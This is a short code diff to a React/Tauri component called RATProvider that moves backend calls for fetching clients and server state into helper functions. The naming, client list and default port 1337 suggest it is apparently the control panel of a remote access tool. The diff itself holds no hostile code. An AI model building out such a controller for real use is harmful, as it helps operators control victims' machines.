@@ -1,9 +1,9 @@
 import React, { useState, useEffect, useRef } from "react";
 import { RATContext } from "./RATContext";
-import { invoke } from "@tauri-apps/api/tauri";
 import { listen } from "@tauri-apps/api/event";
 import toast from "react-hot-toast";
 import { RATState, RATClient, RATProviderProps } from "../../types";
+import { fetchClientsCmd, fetchStateCmd } from "./RATCommands";
 
 export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
   const [port, setPort] = useState<string>("1337");
@@ -16,11 +16,11 @@ export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
   const [selectedClient, setSelectedClient] = useState<string>("");
 
   async function fetchClients() {
-    setClientList(await invoke("fetch_clients"));
+    setClientList(await fetchClientsCmd());
   }
 
   async function fetchState() {
-    const state: RATState = await invoke("fetch_state");
+    const state: RATState = await fetchStateCmd();
     const running = state.running;
     setRunning(running);
   }
